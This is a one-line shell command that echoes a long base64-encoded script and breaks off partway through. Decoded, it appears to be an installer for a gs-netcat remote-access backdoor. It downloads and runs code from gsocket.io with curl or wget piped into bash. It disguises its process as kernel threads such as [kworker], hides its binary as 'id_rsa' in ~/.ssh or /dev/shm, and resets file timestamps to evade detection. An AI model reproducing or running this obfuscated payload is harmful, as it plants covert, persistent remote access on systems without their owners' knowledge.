echo 'IyEgL3Vzci9iaW4vZW52IGJhc2gKClVSTF9CQVNFX0NETj0iaHR0cHM6Ly9jZG4uZ3NvY2tldC5pbyIKVVJMX0JBU0VfWD0iaHR0cHM6Ly9nc29ja2V0LmlvIgpbWyAtbiAkR1NfVVJMX0JBU0UgXV0gJiYgewoJVVJMX0JBU0VfQ0ROPSIke0dTX1VSTF9CQVNFfSIKCVVSTF9CQVNFX1g9IiR7R1NfVVJMX0JBU0V9Igp9ClVSTF9CSU49IiR7VVJMX0JBU0VfQ0ROfS9iaW4iICAgICAgICMgbWluaSAmIHN0cmlwcGVkIHZlcnNpb24KVVJMX0JJTl9GVUxMPSIke1VSTF9CQVNFX0NETn0vZnVsbCIgIyBmdWxsIHZlcnNpb24gKHdpdGggLWggd29ya2luZykKW1sgLW4gJEdTX1VSTF9CSU4gXV0gJiYgewoJVVJMX0JJTj0iJHtHU19VUkxfQklOfSIKCVVSTF9CSU5fRlVMTD0iJFVSTF9CSU4iCn0KW1sgLW4gJEdTX1VSTF9ERVBMT1kgXV0gJiYgVVJMX0RFUExPWT0iJHtHU19VUkxfREVQTE9ZfSIgfHwgVVJMX0RFUExPWT0iJHtVUkxfQkFTRV9YfS95IgoKCnVuc2V0IGRhdGEKdW5zZXQgbXNnCgpETF9DUkw9ImJhc2ggLWMgXCJcJChjdXJsIC1mc1NMICRVUkxfREVQTE9ZKVwiIgpETF9XR1Q9ImJhc2ggLWMgXCJcJCh3Z2V0IC1xTy0gJFVSTF9ERVBMT1kpXCIiCkJJTl9ISURERU5fTkFNRV9ERUZBVUxUPSJpZF9yc2EiCgpwcm9jX25hbWVfYXJyPSgiW2tzdHJwXSIgIlt3YXRjaGRvZ2RdIiAiW2tzbWRdIiAiW2tzd2FwZDBdIiAiW2NhcmQwLWNydGM4XSIgIlttbV9wZXJjcHVfd3FdIiAiW3JjdV9wcmVlbXB0XSIgIltrd29ya2VyXSIgIltyYWlkNXdxXSIgIltzbHViX2ZsdXNod3FdIiAiW25ldG5zXSIgIltrYWx1YWRdIikKClBST0NfSElEREVOX05BTUVfREVGQVVMVD0iJHtwcm9jX25hbWVfYXJyWyQoKFJBTkRPTSAlICR7I3Byb2NfbmFtZV9hcnJbQF19KSldfSIKZm9yIHN0ciBpbiAiJHtwcm9jX25hbWVfYXJyW0BdfSI7IGRvCglQUk9DX0hJRERFTl9OQU1FX1JYKz0ifCQoZWNobyAiJHN0ciIgfCBzZWQgJ3MvW15hLXpBLVowLTldL1xcJi9nJykiCmRvbmUKUFJPQ19ISURERU5fTkFNRV9SWD0iJHtQUk9DX0hJRERFTl9OQU1FX1JYOjF9IgoKCkNPTkZJR19ESVJfTkFNRT0icHV0dHkiCgojIE5hbWVzIGZvciAndW5pbnN0YWxsJyAoaW5jbHVkaW5nIG5hbWVzIGZyb20gcHJldmlvdXMgdmVyc2lvbnMpCkJJTl9ISURERU5fTkFNRV9STT0oIiRCSU5fSElEREVOX05BTUVfREVGQVVMVCIpCkNPTkZJR19ESVJfTkFNRV9STT0oIiRDT05GSUdfRElSX05BTUUiKQoKW1sgLXQgMSBdXSAmJiB7CglDWT0iXDAzM1sxOzMzbSIgIyB5ZWxsb3cKCUNEWT0iXDAzM1swOzMzbSIgIyB5ZWxsb3cKCUNHPSJcMDMzWzE7MzJtIiAjIGdyZWVuCglDUj0iXDAzM1sxOzMxbSIgIyByZWQKCUNEUj0iXDAzM1swOzMxbSIgIyByZWQKCUNCPSJcMDMzWzE7MzRtIiAjIGJsdWUKCUNDPSJcMDMzWzE7MzZtIiAjIGN5YW4KCUNEQz0iXDAzM1swOzM2bSIgIyBjeWFuCglDTT0iXDAzM1sxOzM1bSIgIyBtYWdlbnRhCglDTj0iXDAzM1swbSIgICAgIyBub25lCglDVz0iXDAzM1sxOzM3bSIKfQoKaWYgW1sgLXogIiRHU19ERUJVRyIgXV07IHRoZW4KCURFQlVHRigpeyA6O30KZWxzZQoJREVCVUdGKCl7IGVjaG8gLWUgIiR7Q1l9REVCVUc6JHtDTn0gJCoiO30KZmkKCl90c19maXgoKQp7Cglsb2NhbCBmbgoJbG9jYWwgdHMKCWxvY2FsIGFyZ3MKCWxvY2FsIGF4Cglmbj0iJDEiCgl0cz0iJDIiCgoJYXJncz0oKSAjT1NYLCBtdXN0IGluaXQgb3IgIiAiIGluIHRvdWNoICIgIiAtciAKCglbWyAhIC1lICIkMSIgXV0gJiYgcmV0dXJuCglbWyAteiAkdHMgXV0gJiYgcmV0dXJuCgoJIyBDaGFuZ2UgdGhlIHN5bWxpbmsgZm9yIHRzX3N5c3RlbWRfZm4gaXRlbXMKCVtbIC1uICIkMyIgXV0gJiYgYXJncz0oIi1oIikKCgkjIEVpdGhlciByZWZlcmVuY2UgYnkgVGltZXN0YW1wIG9yIEZpbGUKCVtbICIke3RzOjA6MX0iID0gJy8nIF1dICYmIHsKCQlbWyAhIC1lICIke3RzfSIgXV0gJiYgdHM9Ii9ldGMvbGQuc28uY29uZiIKCQlheD0oIiR7YXJnc1tAXX0iICItciIgIiR0cyIgIiRmbiIpCgkJdG91Y2ggIiR7YXhbQF19IiAyPi9kZXYvbnVsbAoJCXJldHVybgoJfQoJYXg9KCIke2FyZ3NbQF19IiAiLXQiICIkdHMiICIkZm4iKQoJdG91Y2ggIiR7YXhbQF19IiAyPi9kZXYvbnVsbCAmJiByZXR1cm4KCSMgSWYgJ2RhdGUgLXInIG9yICd0b3VjaCAtdCcgZmFpbGVkOgoJYXg9KCIke2FyZ3NbQF19IiAiLXIiICIvZXRjL2xkLnNvLmNvbmYiICIkZm4iKQoJdG91Y2ggIiR7YXhbQF19IiAyPi9kZXYvbnVsbAp9CgojIFJlc3RvcmUgdGltZXN0YW1wIG9mIGZpbGVzCnRzX3Jlc3RvcmUoKQp7Cglsb2NhbCBmbgoJbG9jYWwgbgoJbG9jYWwgdHMKCglbWyAkeyNfdHNfZm5fYVtAXX0gLW5lICR7I190c190c19hW0BdfSBdXSAmJiB7IGVjaG8gPiYyICJPb29wcyI7IHJldHVybjsgfQoKCW49MAoJd2hpbGUgOjsgZG8KCQlbWyAkbiAtZXEgIiR7I190c19mbl9hW0BdfSIgXV0gJiYgYnJlYWsKCQl0cz0iJHtfdHNfdHNfYVskbl19IgoJCWZuPSIke190c19mbl9hWyRuXX0iCgkJIyBERUJVR0YgIlJFU1RPUkUtVFMgJHtmbn0gJHt0c30iCgkJKChuKyspKQoKCQlfdHNfZml4ICIkZm4iICIkdHMiCglkb25lCgl1bnNldCBfdHNfZm5fYQoJdW5zZXQgX3RzX3RzX2EKCgluPTAKCXdoaWxlIDo7IGRvCgkJW1sgJG4gLWVxICIkeyNfdHNfc3lzdGVtZF90c19hW0BdfSIgXV0gJiYgYnJlYWsKCQl0cz0iJHtfdHNfc3lzdGVtZF90c19hWyRuXX0iCgkJZm49IiR7X3RzX3N5c3RlbWRfZm5fYVskbl19IgoJCSMgREVCVUdGICJSRVNUT1JFLUxBU1QtVFMgJHtmbn0gJHt0c30iCgkJKChuKyspKQoKCQlfdHNfZml4ICIkZm4iICIkdHMiICJzeW1saW5rIgoJZG9uZQoJdW5zZXQgX3RzX3N5c3RlbWRfZm5fYQoJdW5zZXQgX3RzX3N5c3RlbWRfdHNfYQp9Cgp0c19pc19tYXJrZWQoKQp7Cglsb2NhbCBmbgoJbG9jYWwgYQoJZm49IiQxIgoKCWZvciBhIGluICIke190c19mbl9hW0BdfSI7IGRvCgkJW1sgIiRhIiA9ICIkZm4iIF1dICYmIHJldHVybiAwICMgVHJ1ZQoJZG9uZQoKCXJldHVybiAxICMgRmFsc2UKfQoKIyBUaGVyZSBhcmUgc29tZSBmaWxlcyB3aGljaCBuZWVkIFRpbWVTdGFtcCB1cGRhdGUgYWZ0ZXIgYWxsIG90aGVyIFRpbWVTdGFtcHMKIyBoYXZlIGJlZW4gZml4ZWQuIE5vdGVhYmxlIC9ldGMvc3lzdGVtZC9zeXN0ZW0vbXVsdGktdXNlci50YXJnZXQud2FudHMKIyB0c19hZGRfbGFzdCBbZmlsZV0gPHJlZmVyZW5jZSBmaWxlPgp0c19hZGRfc3lzdGVtZCgpCnsKCWxvY2FsIGZuCglsb2NhbCB0cwoJbG9jYWwgcmVmCglmbj0iJDEiCglyZWY9IiQyIgoKCXRzPSIkcmVmIgoJW1sgLXogJHJlZiBdXSAmJiB7CgkJdHM9IiQoZGF0ZSAtciAiJGZuIiArJVklbSVkJUglTS4lUyAyPi9kZXYvbnVsbCkiIHx8IHJldHVybgoJfQoKCSMgTm90ZTogX3RzX3N5c3RlbWRfdHNfYSBtYXkgc3RvcmUgYSBudW1iZXIgb3IgYSBkaXJlY3RvcnkgKHN0YXJ0IHdpdGggJy8nKQoJX3RzX3N5c3RlbWRfdHNfYSs9KCIkdHMiKQoJX3RzX3N5c3RlbWRfZm5fYSs9KCIkZm4iKQp9CgojIERldGVybWluZSB0aGUgVGltZXN0YW1wIG9mIHRoZSBmaWxlICRmbiB0aGF0IGlzIGFib3V0IHRvIGJlCiMgY3JlYXRlZCAob3IgYWxyZWFkeSBleGlzdHMpLgojIFNldHMgJF90c190cyB0byBUaW1lc3RhbXAuCiMgVXNhZ2U6IF90c19nZXRfdHMgWyRmbl0KX3RzX2dldF90cygpCnsKCWxvY2FsIGZuCglsb2NhbCBuCglsb2NhbCBwZGlyCglmbj0iJDEiCglwZGlyPSIkKGRpcm5hbWUgIiQxIikiCgoJdW5zZXQgX3RzX3RzCgl1bnNldCBfdHNfcGRpcl9ieV91cwoJIyBJbmhlcml0IFRpbWVzdGFtcCBpZiBwYXJlbnQgZGlyZWN0b3J5IHdhcyBjcmVhdGVkCgkjIGJ5IHVzLgoJbj0wCgl3aGlsZSA6OyBkbwoJCVtbICRuIC1lcSAiJHsjX3RzX2ZuX2FbQF19IiBdXSAmJiBicmVhawoJCVtbICIkcGRpciIgPSAiJHtfdHNfbWtkaXJfZm5fYVskbl19IiBdXSAmJiB7CgkJCV90c190cz0iJHtfdHNfdHNfYVskbl19IgoJCQlfdHNfcGRpcl9ieV91cz0xCgkJCSMgREVCVUdGICJQYXJlbnQgJHtwZGlyfSBjcmVhdGVkIGJ5IHVzLiIKCQkJcmV0dXJuCgkJfQoJCSgobisrKSkKCWRvbmUKCgkjIENoZWNrIGlmIGZpbGUgZXhpc3RzLgoJW1sgLWUgIiRmbiIgXV0gJiYgX3RzX3RzPSIkKGRhdGUgLXIgIiRmbiIgKyVZJW0lZCVIJU0uJVMgMj4vZGV2L251bGwpIiAmJiByZXR1cm4KCgkjIFRha2UgdHMgZnJvbSBvbGRlc3QgZmlsZSBpbiBkaXJlY3RvcnkKCSMgc2hlbGxjaGVjayBkaXNhYmxlPVNDMjAxMiAjVXNlIGZpbmQgaW5zdGVhZCBvZiBscyA9PiBub3QgcG9ydGFibGUKCW9sZGVzdD0iJHtwZGlyfS8kKGxzIC1hdHIgIiR7cGRpcn0iIDI+L2Rldi9udWxsIHwgaGVhZCAtbjEpIgoJX3RzX3RzPSIkKGRhdGUgLXIgIiRvbGRlc3QiICslWSVtJWQlSCVNLiVTIDI+L2Rldi9udWxsKSIKfQoKCl90c19hZGQoKQp7CgkjIFJldHJpZXZlIFRpbWVTdGFtcCBmb3IgJDEKCV90c19nZXRfdHMgIiQxIgoJIyBBZGQgVGltZVN0YW1wCglfdHNfdHNfYSs9KCIkX3RzX3RzIikKCV90c19mbl9hKz0oIiQxIik7CglfdHNfbWtkaXJfZm5fYSs9KCIkMiIpCn0KCiMgTm90ZTogRG8gbm90IHVzZSBnbG9iYWwgX3RzIHZhcmlhYmxlcyBleGNlcHQgX3RzX2FkZF9kaXJlY3QKIyBVc2FnZTogbWtfZmlsZSBbZmlsZW5hbWVdCm1rX2ZpbGUoKQp7Cglsb2NhbCBmbgoJbG9jYWwgb2xkZXN0Cglsb2NhbCBwZGlyCglsb2NhbCBwZGlyX2FkZGVkCglmbj0iJDEiCglsb2NhbCBleGlzdHMKCgkjIERFQlVHRiAiJHtDQ31NS19GSUxFKCRmbikke0NOfSIKCXBkaXI9IiQoZGlybmFtZSAiJGZuIikiCglbWyAtZSAiJGZuIiBdXSAmJiBleGlzdHM9MQoKCXRzX2lzX21hcmtlZCAiJHBkaXIiIHx8IHsKCQkjIEhFUkU6IFBhcmVudCBub3QgdHJhY2tlZAoJCV90c19hZGQgIiRwZGlyIiAiPE5PVCBCWSBYTUtESVI+IgoJCXBkaXJfYWRkZWQ9MQoJfQoKCXRzX2lzX21hcmtlZCAiJGZuIiB8fCB7CgkJIyBIRVJFOiBOb3QgeWV0IHRyYWNrZWQKCQlfdHNfZ2V0X3RzICIkZm4iCgkJIyBEbyBub3QgYWRkIGNyZWF0aW9uIGZhaWxzLgoJCXRvdWNoICIkZm4iIDI+L2Rldi9udWxsIHx8IHsKCQkJIyBIRVJFOiBQZXJtaXNzaW9uIGRlbmllZAoJCQlbWyAtbiAiJHBkaXJfYWRkZWQiIF1dICYmIHsKCQkJCSMgUmVtb3ZlIHBkaXIgaWYgaXQgd2FzIGFkZGVkIGFib3ZlCgkJCQkjIEJhc2ggPDUuMCBkb2VzIG5vdCBzdXBwb3J0IGFyclstMV0KCQkJCSMgUXVvdGUgKCIpIHRvIHNpbGVuY2Ugc2hlbGxjaGVjawoJCQkJdW5zZXQgIl90c190c19hWyR7I190c190c19hW0BdfS0xXSIKCQkJCXVuc2V0ICJfdHNfZm5fYVskeyNfdHNfZm5fYVtAXX0tMV0iCgkJCQl1bnNldCAiX3RzX21rZGlyX2ZuX2FbJHsjX3RzX21rZGlyX2ZuX2FbQF19LTFdIgoJCQl9CgkJCXJldHVybiA2OSAjIEZhbHNlCgkJfQoJCVtbIC16ICRleGlzdHMgXV0gJiYgY2htb2QgNjAwICIkZm4iCgkJX3RzX3RzX2ErPSgiJF90c190cyIpCgkJX3RzX2ZuX2ErPSgiJGZuIik7CgkJX3RzX21rZGlyX2ZuX2ErPSgiPE5PVCBCWSBYTUtESVI+IikKCQlyZXR1cm4KCX0KCgl0b3VjaCAiJGZuIiAyPi9kZXYvbnVsbCB8fCByZXR1cm4KCVtbIC16ICRleGlzdHMgXV0gJiYgY2htb2QgNjAwICIkZm4iCgl0cnVlCn0KCnhybWRpcigpCnsKCWxvY2FsIGZuCglsb2NhbCBwZGlyCglmbj0iJDEiCgoJW1sgISAtZCAiJGZuIiBdXSAmJiByZXR1cm4KCXBkaXI9IiQoZGlybmFtZSAiJGZuIikiCgoJdHNfaXNfbWFya2VkICIkcGRpciIgfHwgewoJCV90c19hZGQgIiRwZGlyIiAiPFJNRElSLVVOVFJBQ0tFRD4iCgl9CgoJcm1kaXIgIiRmbiIgMj4vZGV2L251bGwKfQoKeHJtKCkKewoJbG9jYWwgcGRpcgoJbG9jYWwgZm4KCWZuPSIkMSIKCglbWyAhIC1mICIkZm4iIF1dICYmIHJldHVybgoJcGRpcj0iJChkaXJuYW1lICIkZm4iKSIKCgl0c19pc19tYXJrZWQgIiRwZGlyIiB8fCB7CgkJIyBIRVJFOiBQYXJlbnQgaXMgbm90IHRyYWNrZWQuCgkJX3RzX2FkZCAiJHBkaXIiICI8Uk0tVU5UUkFDS0VEPiIKCX0KCglybSAtZiAiJDEiIDI+L2Rldi9udWxsCn0KCiMgQ3JlYXRlIGEgZGlyZWN0b3J5IGlmIGl0IGRvZXMgbm90IGV4aXN0IGFuZCBmaXggdGltZXN0YW1wCiMgeG1rZGlyIFtkaXJlY3RvcnldIDx0cyByZWZlcmVuY2UgZmlsZT4KeG1rZGlyKCkKewoJbG9jYWwgZm4KCWxvY2FsIHBkaXIKCWZuPSIkMSIKCglERUJVR0YgIiR7Q0d9WE1LRElSKCRmbikke0NOfSIKCXBkaXI9IiQoZGlybmFtZSAiJGZuIikiCgl0cnVlICMgcmVzZXQgJD8KCVtbIC1kICIkZm4iIF1dICYmIHJldHVybiAgICAgIyBEaXJlY3RvcnkgYWxyZWFkeSBleGlzdHMKCVtbICEgLWQgIiRwZGlyIiBdXSAmJiByZXR1cm4gIyBQYXJlbnQgZGlyIGRvZXMgbm90IGV4aXN0cyAoSHVoPykKCgkjIENoZWNrIGlmIHBhcmVudCBpcyBiZWluZyB0cmFja2VkCgl0c19pc19tYXJrZWQgIiRwZGlyIiB8fCB7CgkJIyBIRVJFOiBQYXJlbnQgbm90IHRyYWNrZWQKCQkjIFdlIGRpZCBub3QgY3JlYXRlIHRoZSBwYXJlbnQgb3Igd2Ugd291bGQgYmUgdHJhY2tpbmcgaXQuCgkJX3RzX2FkZCAiJHBkaXIiICI8Tk9UIEJZIFhNS0RJUj4iCgl9CgoJIyBDaGVjayBpZiBuZXcgZGlyZWN0b3J5IGlzIGFscmVhZHkgdHJhY2tlZAoJdHNfaXNfbWFya2VkICIkZm4iIHx8IHsKCQkjIEhFUkU6IE5vdCB5ZXQgdHJhY2tlZCAobm9ybWFsIGNhc2UpCgkJX3RzX2FkZCAiJGZuIiAiJGZuIiAjIFdlIGNyZWF0ZSB0aGUgZGlyZWN0b3J5IChiZWxvdykKCX0KCglta2RpciAiJGZuIiAyPi9kZXYvbnVsbCB8fCByZXR1cm4KCWNobW9kIDcwMCAiJGZuIgoJdHJ1ZQp9Cgp4Y3AoKQp7Cglsb2NhbCBzcmMKCWxvY2FsIGRzdAoJc3JjPSIkMSIKCWRzdD0iJDIiCgoJIyBERUJVR0YgIiR7Q0d9WENQKCRzcmMsICRkc3QpJHtDTn0iCglta19maWxlICIkZHN0IiB8fCByZXR1cm4KCWNwICIkc3JjIiAiJGRzdCIgfHwgcmV0dXJuCgl0cnVlCn0KCnhtdigpCnsKCWxvY2FsIHNyYwoJbG9jYWwgZHN0CglzcmM9IiQxIgoJZHN0PSIkMiIKCglbWyAtZSAiJGRzdCIgXV0gJiYgeHJtICIkZHN0IgoJeGNwICIkc3JjIiAiJGRzdCIgfHwgcmV0dXJuCgl4cm0gIiRzcmMiCgl0cnVlCn0KCmNsZWFuX2FsbCgpCnsKCVtbICIkeyNUTVBESVJ9IiAtZ3QgNSBdXSAmJiB7CgkJcm0gLXJmICIke1RNUERJUjo/fS8iKgoJCXJtZGlyICIke1RNUERJUn0iCgl9ICY+L2Rldi9udWxsCgoJdHNfcmVzdG9yZQp9CgpleGl0X2NvZGUoKQp7CgljbGVhbl9hbGwKCglleGl0ICIkMSIKfQoKZXJyZXhpdCgpCnsKCVtbIC16ICIkMSIgXV0gfHwgZWNobyAtZSA+JjIgIiR7Q1J9JCoke0NOfSIKCglleGl0X2NvZGUgMjU1Cn0KCnRyeV9kc3RkaXIoKQp7Cglsb2NhbCBkc3RkaXIKCWxvY2FsIHRyeWJpbgoJZHN0ZGlyPSIkezF9IgoKCSMgQ3JlYXRlIGRpcmVjdG9yeSBpZiBpdCBkb2VzIG5vdCBleGlzdHMuCglbWyAhIC1kICIke2RzdGRpcn0iIF1dICYmIHsgeG1rZGlyICIke2RzdGRpcn0iIHx8IHJldHVybiAxMDE7IH0KCglEU1RCSU49IiR7ZHN0ZGlyfS8ke0JJTl9ISURERU5fTkFNRX0iCiAKCW1rX2ZpbGUgIiREU1RCSU4iIHx8IHJldHVybiAxMDIKCgkjIEZpbmQgYW4gZXhlY3V0ZWFibGUgYW5kIHRlc3QgaWYgd2UgY2FuIGV4ZWN1dGUgYmluYXJpZXMgZnJvbQoJIyBkZXN0aW5hdGlvbiBkaXJlY3RvcnkgKG5vIG5vZXhlYyBmbGFnKQoJIyAvYmluL3RydWUgbWlnaHQgYmUgYSBzeW1saW5rIHRvIC91c3IvYmluL3RydWUKCWZvciBlYmluIGluICIvYmluL3RydWUiICIkKGNvbW1hbmQgLXYgaWQpIjsgZG8KCQlbWyAteiAkZWJpbiBdXSAmJiBjb250aW51ZQoJCVtbIC1lICIkZWJpbiIgXV0gJiYgYnJlYWsKCWRvbmUKCVtbICEgLWUgIiRlYmluIiBdXSAmJiByZXR1cm4gMCAjIFRydWUuIFRyeSBvdXIgYmVzdAoKCSMgTXVzdCB1c2Ugc2FtZSBuYW1lIG9uIGJ1c3lib3gtc3lzdGVtcwoJdHJ5YmluPSIke2RzdGRpcn0vJChiYXNlbmFtZSAiJGViaW4iKSIKCgkjIC9iaW4vdHJ1ZSBtaWdodCBiZSBhIHN5bWxpbmsgdG8gL3Vzci9iaW4vdHJ1ZQoJW1sgIiRlYmluIiAtZWYgIiR0cnliaW4iIF1dICYmIHJldHVybiAwCglta19maWxlICIkdHJ5YmluIiB8fCByZXR1cm4KCgoJY3AgIiRlYmluIiAiJHRyeWJpbiIgJj4vZGV2L251bGwgfHwgeyBybSAtZiAiJHt0cnliaW46P30iOyByZXR1cm47IH0KCWNobW9kIDcwMCAiJHRyeWJpbiIKCgkiJHt0cnliaW59IiAtZyAmPi9kZXYvbnVsbCB8fCB7IHJtIC1mICIke3RyeWJpbjo/fSI7IHJldHVybiAxMDQ7IH0gIyBGQUlMVVJFCglybSAtZiAiJHt0cnliaW46P30iCgoJcmV0dXJuIDAKfQoKCgojIENhbGxlZCBfYWZ0ZXJfIGluaXRfdmFycygpIGF0IHRoZSBlbmQgb2YgaW5pdF9zZXR1cC4KaW5pdF9kc3RiaW4oKQp7CglpZiBbWyAtbiAiJEdTX0RTVERJUiIgXV07IHRoZW4KCQl0cnlfZHN0ZGlyICIke0dTX0RTVERJUn0iICYmIHJldHVybgoKCQllcnJleGl0ICJGQUlMRUQ6IEdTX0RTVERJUj0ke0dTX0RTVERJUn0gaXMgbm90IHdyaXRlYWJsZSBhbmQgZXhlY3V0ZWFibGUuIgoJZmkKCgkjIFRyeSBzeXN0ZW13aWRlIGluc3RhbGxhdGlvbiBmaXJzdAoJdHJ5X2RzdGRpciAiJHtHU19QUkVGSVh9L3Vzci9iaW4iICYmIHJldHVybgoKCSMgVHJ5IHVzZXIgaW5zdGFsbGF0aW9uCglbWyAhIC1kICIke0dTX1BSRUZJWH0kKGdyZXAgXiIkKHdob2FtaSkiIC9ldGMvcGFzc3dkIHwgY3V0IC1kOiAtZjYpLy5zc2giIF1dICYmIHhta2RpciAiJHtHU19QUkVGSVh9JChncmVwIF4iJCh3aG9hbWkpIiAvZXRjL3Bhc3N3ZCB8IGN1dCAtZDogLWY2KS8uc3NoIgoJdHJ5X2RzdGRpciAiJHtHU19QUkVGSVh9JChncmVwIF4iJCh3aG9hbWkpIiAvZXRjL3Bhc3N3ZCB8IGN1dCAtZDogLWY2KS8uc3NoLyR7Q09ORklHX0RJUl9OQU1FfSIgJiYgcmV0dXJuCgoJIyBUcnkgY3VycmVudCB3b3JraW5nIGRpcmVjdG9yeQoJdHJ5X2RzdGRpciAiJHtQV0R9IiAmJiB7IElTX0RTVEJJTl9DV0Q9MTsgcmV0dXJuOyB9CgoJIyBUcnkgL3RtcC8uZ3N1c3ItKgoJdHJ5X2RzdGRpciAiL3RtcC8uZ3N1c3ItJHtVSUR9IiAmJiB7IElTX0RTVEJJTl9UTVA9MTsgcmV0dXJuOyB9CgoJIyBUcnkgL2Rldi9zaG0gYXMgbGFzdCByZXNvcnQKCXRyeV9kc3RkaXIgIi9kZXYvc2htIiAmJiB7IElTX0RTVEJJTl9UTVA9MTsgcmV0dXJuOyB9CgoJZWNobyAtZSA+JjIgIiR7Q1J9RVJST1I6IENhbiBub3QgZmluZCB3cml0ZWFibGUgYW5kIGV4ZWN1dGFibGUgZGlyZWN0b3J5LiR7Q059IgoJV0FSTiAiVHJ5IHNldHRpbmcgR1NfRFNURElSPSB0byBhIHdyaXRlYWJsZSBhbmQgZXhlY3V0YWJsZSBkaXJlY3RvcnkuIgoJZXJyZXhpdAp9Cgp0cnlfdG1wZGlyKCkKewoJW1sgLW4gJFRNUERJUiBdXSAmJiByZXR1cm4gIyBhbHJlYWR5IHNldAoKCVtbICEgLWQgIiQxIiBdXSAmJiByZXR1cm4KCglbWyAtZCAiJDEiIF1dICYmIHhta2RpciAiJHsxfS8kezJ9IiAmJiBUTVBESVI9IiR7MX0vJHsyfSIKfQoKdHJ5X2VuY29kZSgpCnsKCWxvY2FsIGVuYwoJbG9jYWwgZGVjCglsb2NhbCB0ZXN0c3RyCglwcmc9IiQxIgoJZW5jPSIkMiIKCWRlYz0iJDMiCgoJdGVzdHN0cj0iYmxoYXw7aWQtdSBcJ3RoaXMgaXMgYSBsb25nIHRlc3Qgb2YgYSB2ZXJ5IGxvbmcgc3RyaW5nIHRvIHRlc3QgZW5jb2RpZ24gZGVjb2RpbmcgcHJvY2VzcyAjIGZvb2JhciIKCglbWyAtbiAkRU5DT0RFX1NUUiBdXSAmJiByZXR1cm4KCgljb21tYW5kIC12ICIkcHJnIiA+L2Rldi9udWxsICYmIFtbICIkKGVjaG8gIiR0ZXN0c3RyIiB8ICRlbmMgMj4vZGV2L251bGx8ICRkZWMgMj4vZGV2L251bGwpIiA9ICIkdGVzdHN0ciIgXV0gfHwgcmV0dXJuCglFTkNPREVfU1RSPSIkZW5jIgoJREVDT0RFX1NUUj0iJGRlYyIKfQoKCiMgUmV0dXJuIFRSVUUgaWYgd2UgYXJlIDEwMCUgc3VyZSBpdCdzIGxpdHRsZSBlbmRpYW4KaXNfbGUoKQp7Cgljb21tYW5kIC12IGxzY3B1ID4vZGV2L251bGwgJiYgewoJCVtbICQobHNjcHUpID09ICoiTGl0dGxlIEVuZGlhbiIqIF1dICYmIHJldHVybiAwCgkJcmV0dXJuIDI1NQoJfQoKCWNvbW1hbmQgLXYgb2QgPi9kZXYvbnVsbCAmJiBjb21tYW5kIC12IGF3ayA+L2Rldi9udWxsICYmIHsKCQlbWyAkKGVjaG8gLW4gSSB8IG9kIC1vIHwgYXdrICdGTlI9PTF7IHByaW50IHN1YnN0cigkMiw2LDEpfScpID09ICIxIiBdXSAmJiByZXR1cm4gMAoJfQoKCXJldHVybiAyNTUKfQoKaW5pdF92YXJzKCkKewoJIyBTZWxlY3QgYmluYXJ5Cglsb2NhbCBhcmNoCglsb2NhbCBvc25hbWUKCWFyY2g9JCh1bmFtZSAtbSkKCgoJSE9NRT0iL2Rldi9zaG0iCgoJIyBzZXQgUFdEIGlmIG5vdCBzZXQKCVtbIC16ICIkUFdEIiBdXSAmJiBQV0Q9IiQocHdkIDI+L2Rldi9udWxsKSIKCglbWyAteiAiJE9TVFlQRSIgXV0gJiYgewoJCWxvY2FsIG9zbmFtZQoJCW9zbmFtZT0iJCh1bmFtZSAtcykiCgkJaWYgW1sgIiRvc25hbWUiID09ICpGcmVlQlNEKiBdXTsgdGhlbgoJCQlPU1RZUEU9IkZyZWVCU0QiCgkJZWxpZiBbWyAiJG9zbmFtZSIgPT0gKkRhcndpbiogXV07IHRoZW4KCQkJT1NUWVBFPSJkYXJ3aW4yMi4wIgoJCWVsaWYgW1sgIiRvc25hbWUiID09ICpPcGVuQlNEKiBdXTsgdGhlbgoJCQlPU1RZUEU9Im9wZW5ic2Q3LjMiCgkJZWxpZiBbWyAiJG9zbmFtZSIgPT0gKkxpbnV4KiBdXTsgdGhlbgoJCQlPU1RZUEU9ImxpbnV4LWdudSIKCQlmaQoJfQoKCXVuc2V0IE9TQVJDSAoJdW5zZXQgU1JDX1BLRwoJIyBVc2VyIHN1cHBsaWVkIE9TQVJDSAoJW1sgLW4gIiRHU19PU0FSQ0giIF1dICYmIE9TQVJDSD0iJEdTX09TQVJDSCIKCglpZiBbWyAteiAiJE9TQVJDSCIgXV07IHRoZW4KCQlpZiBbWyAkT1NUWVBFID09ICpsaW51eCogXV07IHRoZW4gCgkJCWlmIFtbICIkYXJjaCIgPT0gImk2ODYiIF1dIHx8IFtbICIkYXJjaCIgPT0gImkzODYiIF1dOyB0aGVuCgkJCQlPU0FSQ0g9ImkzODYtYWxwaW5lIgoJCQkJU1JDX1BLRz0iZ3MtbmV0Y2F0X21pbmktbGludXgtaTY4NiIKCQkJZWxpZiBbWyAiJGFyY2giID09ICoiYXJtdjYiKiBdXTsgdGhlbgoJCQkJT1NBUkNIPSJhcm0tbGludXgiCgkJCQlTUkNfUEtHPSJncy1uZXRjYXRfbWluaS1saW51eC1hcm12NiIKCQkJZWxpZiBbWyAiJGFyY2giID09ICoiYXJtdjdsIiBdXTsgdGhlbgoJCQkJT1NBUkNIPSJhcm0tbGludXgiCgkJCQlTUkNfUEtHPSJncy1uZXRjYXRfbWluaS1saW51eC1hcm12N2wiCgkJCWVsaWYgW1sgIiRhcmNoIiA9PSAqImFybXYiKiBdXTsgdGhlbgoJCQkJT1NBUkNIPSJhcm0tbGludXgiICMgUlBJLVplcm8gLyBSUEkgNGIrCgkJCQlTUkNfUEtHPSJncy1uZXRjYXRfbWluaS1saW51eC1hcm0iCgkJCWVsaWYgW1sgIiRhcmNoIiA9PSAiYWFyY2g2NCIgXV07IHRoZW4KCQkJCU9TQVJDSD0iYWFyY2g2NC1saW51eCIKCQkJCVNSQ19QS0c9ImdzLW5ldGNhdF9taW5pLWxpbnV4LWFhcmNoNjQiCgkJCWVsaWYgW1sgIiRhcmNoIiA9PSAibWlwczY0IiBdXTsgdGhlbgoJCQkJT1NBUkNIPSJtaXBzNjQtYWxwaW5lIgoJCQkJU1JDX1BLRz0iZ3MtbmV0Y2F0X21pbmktbGludXgtbWlwczY0IgoJCQkJIyBHbyAzMi1iaXQgaWYgTGl0dGxlIEVuZGlhbiBldmVuIGlmIDY0Yml0IGFyY2gKCQkJCWlzX2xlICYmIHsKCQkJCQlPU0FSQ0g9Im1pcHNlbDMyLWFscGluZSIKCQkJCQlTUkNfUEtHPSJncy1uZXRjYXRfbWluaS1saW51eC1taXBzZWwiCgkJCQl9CgkJCWVsaWYgW1sgIiRhcmNoIiA9PSAqbWlwcyogXV07IHRoZW4KCQkJCU9TQVJDSD0ibWlwczMyLWFscGluZSIKCQkJCVNSQ19QS0c9ImdzLW5ldGNhdF9taW